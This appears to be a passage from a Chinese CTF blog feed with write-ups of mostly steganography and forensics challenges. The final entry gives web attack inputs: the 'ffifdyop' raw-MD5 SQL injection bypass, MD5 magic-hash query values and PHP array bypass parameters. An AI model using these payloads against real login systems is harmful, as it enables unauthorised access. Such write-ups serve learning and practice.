<pre><code>from PIL import Imagex = y = 200img = Image.new(&quot;RGB&quot;,(x,y))file = open('./new qr.txt','r')for width in range(0,x):    for height in range(0,y):        line = file.readline()        rgb = line.split(',')        img.putpixel((width,height),(int(rgb[0]),int(rgb[1]),int(rgb[2])))
</code></pre>
<p><img src="https://Ro1ing.github.io/post-images/1622377004355.png" alt="" loading="lazy"><br>
将RGB数据写成图片</p>
<pre><code>from PIL import Imagex = y = 200img = Image.new(&quot;RGB&quot;,(x,y))file = open('./qr.txt','r')for width in range(0,x):    for height in range(0,y):        line = file.readline()        rgb = line.split(',')        img.putpixel((width,height),(int(rgb[0]),int(rgb[1]),int(rgb[2])))img.save('flag.jpg')
</code></pre>
<p>一个二维码</p>
<h2 id="ctf2019otaku">[*CTF2019]otaku</h2>
<p>https://0xwindsky.github.io/2020/07/28/buumisc4/<br>
原题hint:The txt is GBK encoding.<br>
看题解 是 word里面有隐藏文字<br>
lastword 进行明文攻击，注意word里隐藏文字不能直接复制，选中那段话右键字体里把隐藏前面的钩去掉后就可以复制<br>
<img src="https://Ro1ing.github.io/post-images/1622377067769.png" alt="" loading="lazy"></p>
<p>网上使用python 将 其转化为GBK模式<br>
我使用notepad<br>
<a href="https://www.php.cn/tool/notepad/427915.html">https://www.php.cn/tool/notepad/427915.html</a></p>
<p><img src="https://Ro1ing.github.io/post-images/1622377121115.png" alt="" loading="lazy"><br>
<img src="https://Ro1ing.github.io/post-images/1622377134723.png" alt="" loading="lazy"><br>
lsb隐写<br>
<img src="https://Ro1ing.github.io/post-images/1622377333612.png" alt="" loading="lazy"></p>
<h2 id="actf新生赛2020music">[ACTF新生赛2020]music</h2>
<p>https://blog.csdn.net/mochu7777777/article/details/109806994</p>
<p>文件异常，并且出现多次字符A1<br>
<img src="https://Ro1ing.github.io/post-images/1622377366071.png" alt="" loading="lazy"></p>
<p>猜测对整个原文件进行了异或，使用010<br>
Editor在工具-&gt;十六进制运算-&gt;二进制异或对整个文件内容进行异或</p>
<figure data-type="image" tabindex="6"><img src="https://Ro1ing.github.io/post-images/1622377376700.png" alt="" loading="lazy"></figure>
<p>保存得到正常音频文件，听内容得到：actfabcdfghijk</p>
<h2 id="mrctf2020hello_-misc">[MRCTF2020]Hello_ misc</h2>
<p>WP<br>
<img src="https://Ro1ing.github.io/post-images/1622377399523.png" alt="" loading="lazy"></p>
<p>red通道保存下来<br>
<img src="https://Ro1ing.github.io/post-images/1622377419706.png" alt="" loading="lazy"><br>
separate<br>
!@#$%67*()-+<br>
不对啊<br>
原来是原来的图片文件分离出来<br>
out.txt<br>
转为二进制发现只有八位二进制的前两位不同<br>
<img src="https://Ro1ing.github.io/post-images/1622377439747.png" alt="" loading="lazy"><br>
<img src="https://Ro1ing.github.io/post-images/1622377444885.png" alt="" loading="lazy"><br>
白色字体改色<br>
<img src="https://Ro1ing.github.io/post-images/1622377462025.png" alt="" loading="lazy"><br>
base64解码每行<br>
110110111111110011110111111111111111111111111111101110000001111111111001101<br>
110110110001101011110111111111111111111111111111111101111111111111110110011<br>
110000101110111011110111111100011111111111001001101110000011111000011111111<br>
110110100001111011110111111011101111111110110110101111111100110111111111111<br>
110110101111111011110111101011101111111110110110101101111100110111111111111<br>
110110100001100000110000001100011100000110110110101110000001111000011111111</p>
<figure data-type="image" tabindex="7"><img src="https://Ro1ing.github.io/post-images/1622377479290.png" alt="" loading="lazy"></figure>
<p>替换He1Lo_mi5c~</p>
<h2 id="actf新生赛2020剑龙">[ACTF新生赛2020]剑龙</h2>
<p><img src="https://Ro1ing.github.io/post-images/1622377493870.png" alt="" loading="lazy"><br>
steghide<br>
<img src="https://Ro1ing.github.io/post-images/1622377505282.png" alt="" loading="lazy"><br>
看到一个没后缀的文件，直接打不开，linux下file一下，知道是pyc文件，<br>
重命名o_o.pyc<br>
因为stegosaurus只识别py、pyc、pyo 文件<br>
<img src="https://Ro1ing.github.io/post-images/1622377519563.png" alt="" loading="lazy"></p>
<h2 id="mrctf2020unravel">[MRCTF2020]Unravel!!</h2>
<p>压缩包有密码<br>
图片进行文件分离<br>
图片- Tokyo<br>
视频提示看文件最后 AES加密/解密<br>
<img src="https://Ro1ing.github.io/post-images/1622377546073.png" alt="" loading="lazy"><br>
得到压缩包里的wav<br>
用SilentEye解密wav得flag<br>
<img src="https://Ro1ing.github.io/post-images/1622377560530.png" alt="" loading="lazy"></p>
<h2 id="gkctf2020harley-quinn">[GKCTF2020]Harley Quinn</h2>
<blockquote>
<p>Hint1:<br>
HQ 电话音&amp;九宫格<br>
Hint2：<br>
FreeFileCamouflage，下载的文件可能显示乱码<br>
<img src="https://Ro1ing.github.io/post-images/1622377581117.png" alt="" loading="lazy"><br>
剪一下<br>
<img src="https://Ro1ing.github.io/post-images/1622377593768.png" alt="" loading="lazy"><br>
222 C<br>
8 T<br>
33 E<br>
444 I<br>
7777 S<br>
33 E<br>
88 U<br>
66 N<br>
CTEISEUN<br>
？？看了看题解为啥我的解密有问题<br>
<img src="https://Ro1ing.github.io/post-images/1622377609233.png" alt="" loading="lazy"><br>
这下可以了 可能是分离的时候有点问题<br>
ctfisfun<br>
<img src="https://Ro1ing.github.io/post-images/1622377655244.png" alt="" loading="lazy"><br>
<img src="https://Ro1ing.github.io/post-images/1622377643999.png" alt="" loading="lazy"></p>
</blockquote>
<h2 id="utctf2020zero">[UTCTF2020]zero</h2>
<p>零字符隐写</p>
<blockquote>
<p>Lorem ipsum dolor ‌‌‌‌‍﻿‍‍sit amet‌‌‌‌‍﻿‍‌, consectetur adipiscing‌‌‌‌‍‬‍‬ elit.‌‌‌‌‍‬﻿‌‌‌‌‌‍‬‌‍ Phasellus quis tempus ante, nec vehicula mi. ‌‌‌‌‍‬‍﻿Aliquam nec‌‌‌‌‍﻿‬﻿ nisi ut neque interdum auctor.‌‌‌‌‍﻿‍﻿ Aliquam felis ‌‌‌‌‍‬‬‌orci, vestibulum ‌‌‌‌‍﻿‬‍sit amet ante‌‌‌‌‍‌﻿‬ at, consectetur‌‌‌‌‍‌﻿﻿ lobortis eros.‌‌‌‌‍‍‍‌ ‌‌‌‌‍‌‌‌Orci varius natoque ‌‌‌‌‍﻿‌﻿penatibus et ‌‌‌‌‍‬‌﻿magnis‌‌‌‌‌﻿‌‍‌‌‌‌‌﻿‌‍ dis ‌‌‌‌‍‍﻿﻿parturient montes, nascetur ridiculus ‌‌‌‌‌﻿‍‌‌‌‌‌‌﻿‬‍mus. In finibus‌‌‌‌‌﻿‌‬ magna‌‌‌‌‌﻿‍﻿ mauris, quis‌‌‌‌‍‬‌‍ auctor ‌‌‌‌‍‬‌‍libero congue quis. ‌‌‌‌‍‬‬‬Duis‌‌‌‌‍‬‌‬ sagittis consequat urna non tristique. Pellentesque eu lorem ‌‌‌‌‍﻿‌‍id‌‌‌‌‍‬‬﻿ quam vestibulum ultricies vel ac purus‌‌‌‌‌﻿‌‍.‌</p>
</blockquote>
<p>https://www.btis.site/2020/05/21/UTCTF-misc%E5%90%88%E9%9B%86<br>
考点：零宽度字符隐写<br>
打开txt，发现显示列数远多于字母数，拿vim打开，发现许多&lt;200b&gt;之类文字，于是想到<br>
零宽度字符<br>
解密网站：<br>
http://330k.github.io/misc_tools/unicode_steganography.html</p>
<h2 id="rctf2019disk">[RCTF2019]disk</h2>
<p>wp：<br>
用7z先解压出0.fat<br>
说明外层的 vmdk 只是容器，并没有加密。将 0.fat 解压出来，再次尝试用 7zip 打开，报错，说明 vmdk 中包含的这个 FAT32 分区被加密了。使用 WinHex 载入这个文件可以看到：<br>
<img src="https://Ro1ing.github.io/post-images/1622377687564.png" alt="" loading="lazy"><br>
rctf{unseCure_quick_form4t_vo1ume<br>
题目中给了<br>
VeraCrypt<br>
密码<br>
对 0.fat<br>
文件进行解密并加载，发现加载成功，为常规卷，加密类型为 AES。<br>
题目设定如下：<br>
An otaku used VeraCrypt to encrypt his favorites.<br>
Password: rctf<br>
Flag format: rctf{a-zA-Z0-9_}<br>
<img src="https://Ro1ing.github.io/post-images/1622377717950.png" alt="" loading="lazy"><br>
<img src="https://Ro1ing.github.io/post-images/1622377731663.png" alt="" loading="lazy"><br>
将此加密盘卸载，使用得到的第二个密码再次加载，加载成功。加密方式是<br>
AES，但是注意该分区是隐藏分区。<br>
<img src="https://Ro1ing.github.io/post-images/1622377741448.png" alt="" loading="lazy"><br>
由于是隐藏分区所以无法直接访问。因此使用<br>
WinHex 载入磁盘，提示无法自动检测分区格式后选择“分区无格式”，并查看该分区扇区数据（DiskGenius 查看磁盘扇区数据也可以）<br>
<img src="https://Ro1ing.github.io/post-images/1622377749638.png" alt="" loading="lazy"><br>
打不开<br>
<img src="https://Ro1ing.github.io/post-images/1622377768010.png" alt="" loading="lazy"><br>
之前一直打不开 原来是winhex要用管理员权限打开</p>
<p>_corrupted_1nner_v0lume}_and_corrupted_1nner_v0lume}_and_corrupted_1nner_v0lume}_and_corrupted_1nner_v0lume}_and_corrupted_1nner_v0lume}_and_corrupted_1nner_v0lume}_and_corrupted_1nner_v0lume}_and_corrupted_1nner_v0lume}_and_corrupted_1nner_v0lume}_and_corrupted_1nner_v0lume}_and_corrupted_1nner_v0lume}_and_corrupte</p>
<p>flag{unseCure_quick_form4t_vo1ume_and_corrupted_1nner_v0lume}</p>
<h2 id="npuctf2020签到">[NPUCTF2020]签到</h2>
<p>mc我的世界 必须要用1.15.2版本<br>
不同版本红石不同<br>
红石控制开关<br>
常量为1 短亮为0<br>
00111001 01100001 00111001<br>
通过二进制串按照8位<br>
ASCII 9a9<br>
Md5 32位加密</p>
<h2 id="npuctf2020碰上彩虹吃定彩虹">[NPUCTF2020]碰上彩虹，吃定彩虹！</h2>
<p>txt中发现<br>
<img src="https://Ro1ing.github.io/post-images/1622377787590.png" alt="" loading="lazy"><br>
凯撒密码解密<br>
autokey<br>
autokey<br>
加密？<br>
vim查看另外一个<br>
<img src="https://Ro1ing.github.io/post-images/1622377798141.png" alt="" loading="lazy"><br>
零宽度字符隐写<br>
<a href="http://330k.github.io/misc_tools/unicode_steganography.html">http://330k.github.io/misc_tools/unicode_steganography.html</a><br>
解密<br>
看wp原来还要这样<br>
<img src="https://Ro1ing.github.io/post-images/1622377815192.png" alt="" loading="lazy"><br>
<img src="https://Ro1ing.github.io/post-images/1622377820172.png" alt="" loading="lazy"><br>
还说要用NTFS<br>
我靠 我什么都没扫出来 原来是360解压直接把NTFS解密出来了</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[[INSHack2019]gflag]]></title>
        <id>https://Ro1ing.github.io/post/inshack2019gflag/</id>
        <link href="https://Ro1ing.github.io/post/inshack2019gflag/">
        </link>
        <updated>2021-03-16T07:30:38.000Z</updated>
        <content type="html"><![CDATA[<p><strong>My brother likes esoteric programming. He sent me this file but I don't see what it is for. Could you help me ?</strong><br>
我哥哥喜欢深奥的程序设计。他给我发了这份文件，但我不知道是做什么用的。你能帮我个忙吗?<br>
<a href="https://static.ctf.insecurity-insa.fr/a7572eb34ba9700b39f1ba7f5869bf301b67d406.tar.gz">GFlag files</a><br>
<img src="https://Ro1ing.github.io/post-images/1615880103330.png" alt="" loading="lazy"><br>
查到WP<br>
https://cosmikflaghunters.wordpress.com/2019/05/05/inshack-2019-gflag/<br>
G1 lines look like axis positioning, so we started to search printing coding and we found GCODE.<br>
As we don’t have a 3D printer, we have to simulate the printing online, we foud the website <a href="http://gcode.ws/">http://gcode.ws</a><br>
Add .gcode at the end of the file and upload it to the website:<br>
<img src="https://Ro1ing.github.io/post-images/1615880184407.png" alt="" loading="lazy"><br>
<img src="https://Ro1ing.github.io/post-images/1615880187535.png" alt="" loading="lazy"><br>
NSA{3d_pr1nt3d_fl49}</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[[HDCTF2019]信号分析]]></title>
        <id>https://Ro1ing.github.io/post/hdctf2019xin-hao-fen-xi/</id>
        <link href="https://Ro1ing.github.io/post/hdctf2019xin-hao-fen-xi/">
        </link>
        <updated>2021-03-15T13:01:42.000Z</updated>
        <content type="html"><![CDATA[<p>2秒的音频没有声音</p>
<figure data-type="image" tabindex="1"><img src="https://Ro1ing.github.io/post-images/1615879711654.png" alt="" loading="lazy"></figure>
<p>波形切换到波形（db）就有图像了<br>
单个波形是有规律的<br>
提示：Hackcube</p>
<p><a href="https://www.freebuf.com/author/mobier">使用HackCube-Special分析固定码信号</a></p>
<h3 id="信号脉冲">信号脉冲</h3>
<figure data-type="image" tabindex="2"><img src="https://Ro1ing.github.io/post-images/1615879749906.png" alt="" loading="lazy"></figure>
<h3 id="固定码遥控信号的构成">固定码遥控信号的构成</h3>
<p><img src="https://Ro1ing.github.io/post-images/1615879755476.png" alt="" loading="lazy"><br>
<img src="https://Ro1ing.github.io/post-images/1615879759978.png" alt="" loading="lazy"><br>
FFFFFFFF 0001 停止码</p>
<p>看wp要得到FFFFFFFF0001然后{}包起来</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ALCTF]Misc]]></title>
        <id>https://Ro1ing.github.io/post/alctfmisc/</id>
        <link href="https://Ro1ing.github.io/post/alctfmisc/">
        </link>
        <updated>2021-01-30T06:46:30.000Z</updated>
        <content type="html"><![CDATA[<p>校内CTF平台 题目</p>
<h2 id="只会影响我拔剑的速度">只会影响我拔剑的速度</h2>
<p>gif逐帧播放</p>
<h2 id="听我娓娓道来">听我娓娓道来</h2>
<p>属性-详细信息-备注 or 16进制</p>
<p>与佛论禅解密网站：http://www.keyfc.net/bbs/tools/tudoucode.aspx</p>
<h2 id="电线鲨鱼">电线鲨鱼</h2>
<p>wireshark打开流量包</p>
<p><img src="1.png" alt="" loading="lazy"><br>
<img src="https://Ro1ing.github.io/post-images/1611989239604.png" alt="" loading="lazy"><br>
or 偷鸡 16进制</p>
<p><img src="2.png" alt="" loading="lazy"><br>
<img src="https://Ro1ing.github.io/post-images/1611989243485.png" alt="" loading="lazy"></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ASIS 2019]Unicorn shop]]></title>
        <id>https://Ro1ing.github.io/post/asis-2019unicorn-shop/</id>
        <link href="https://Ro1ing.github.io/post/asis-2019unicorn-shop/">
        </link>
        <updated>2021-01-30T06:45:22.000Z</updated>
        <content type="html"><![CDATA[<p><img src="image-20200519215130151.png" alt="" loading="lazy"><br>
<img src="https://Ro1ing.github.io/post-images/1611989154422.png" alt="" loading="lazy"><br>
发现这里无论输入任何ID和Price都无法购买</p>
<p>当Price 小于10 时 显示Wrong commodity</p>
<p>当Price 大于10 时 显示Only one char（？） allowed！</p>
<p><img src="image-20200519215322998.png" alt="" loading="lazy"><br>
<img src="https://Ro1ing.github.io/post-images/1611989157234.png" alt="" loading="lazy"><br>
utf8?</p>
<p>https://xz.aliyun.com/t/5402#toc-0</p>
<blockquote>
<h3 id="23-数字显示">2.3 数字显示</h3>
<p>一些国家的数字在显示的时候也可能造成问题，例如孟加拉语的0-9是০ ১ ২ ৩ ৪ ৫ ৬ ৭ ৮ ৯，但是这里的৪ (U+09EA) 实际上是数字4。ASIS CTF 2019 的 <a href="https://xz.aliyun.com/t/(https://github.com/hyperreality/ctf-writeups/tree/master/2019-asis)">Unicorn Shop</a> 也是从Unicode背后的数字角度出发考虑问题。</p>
</blockquote>
<p>在这个网站查找Unicode</p>
<p>https://www.compart.com/en/unicode</p>
<p><img src="image-20200519215746992.png" alt="" loading="lazy"><br>
<img src="https://Ro1ing.github.io/post-images/1611989163598.png" alt="" loading="lazy"><br>
点开找到大于1337的字符即可</p>
<p>参考链接：</p>
<p>https://www.cnblogs.com/Cl0ud/p/12221360.html</p>
<p>https://shawroot.hatenablog.com/entry/2019/10/29/ASIS_2019-Unicorn_shop</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[[BJDCTF 2nd]EasyBaBa]]></title>
        <id>https://Ro1ing.github.io/post/bjdctf-2ndeasybaba/</id>
        <link href="https://Ro1ing.github.io/post/bjdctf-2ndeasybaba/">
        </link>
        <updated>2021-01-30T06:44:31.000Z</updated>
        <content type="html"><![CDATA[<p>感觉 有东西压缩在里面 foremost分离</p>
<p>解压出一个 里面都是出题人.jpg</p>
<p>16进制查看是 视频格式 扫码得到 一点都不Easy😅</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[[BJDCTF2020]Easy MD5]]></title>
        <id>https://Ro1ing.github.io/post/bjdctf2020easy-md5/</id>
        <link href="https://Ro1ing.github.io/post/bjdctf2020easy-md5/">
        </link>
        <updated>2021-01-30T06:43:16.000Z</updated>
        <content type="html"><![CDATA[<p>抓包发现 Hint</p>
<blockquote>
<p>select * from 'admin' where password=md5($pass,true)</p>
</blockquote>
<p>直接提交 <strong>ffifdyop</strong></p>
<p><strong>md5()函数</strong>有两个参数</p>
<p><strong>参数一</strong>是要加密的字符串；</p>
<p><strong>参数二</strong>是输出格式：为true时，表示输出原始16字符二进制格式；默认为false，表示输出32字符十六进制数。</p>
<p>所以要通过注入</p>
<p>如何闭合sql语句？找到一个字符串MD5加密后得到的原始二进制格式在SQL中拼接 成 ‘ or’ 的形式绕过</p>
<p>ffifdyop 这个字符串被 md5 哈希了之后会变成 276f722736c95d99e921722cf9ed621c</p>
<p>而这个字符串的前几位是 ‘or' 6</p>
<p>Mysql 刚好又会吧 hex 转成 ascii 解释，</p>
<p>因此拼接之后的形式是</p>
<blockquote>
<p>1select * from 'admin' where password='' or '6xxxxx'</p>
</blockquote>
<p><img src="image-20200519221047710.png" alt="" loading="lazy"><br>
<img src="https://Ro1ing.github.io/post-images/1611989034103.png" alt="" loading="lazy"><br>
查看源代码</p>
<p><img src="image-20200519221054813.png" alt="" loading="lazy"><br>
<img src="https://Ro1ing.github.io/post-images/1611989037550.png" alt="" loading="lazy"><br>
?a=s155964671a&amp;b=s1091221200a</p>
<p>md5碰撞：<strong>md5码不同但是表示的数字可能相同</strong>，故有md5碰撞导致可能会有安全问题</p>
<p><img src="image-20200519221132965.png" alt="" loading="lazy"><br>
<img src="https://Ro1ing.github.io/post-images/1611989042033.png" alt="" loading="lazy"><br>
后来看发现这一步不用这么复杂</p>
<p>数组绕过：</p>
<p>?a[]=1&amp;b[]=2即可</p>
<p>拓展：</p>
<p>’ffifdyop：’129581926211651571912466741651878684928’<br>
ffifdyop：T0Do#’<strong>or’8</strong><br>
129581926211651571912466741651878684928：<strong>’or’6</strong>]!r,b</p>
]]></content>
    </entry>
</feed>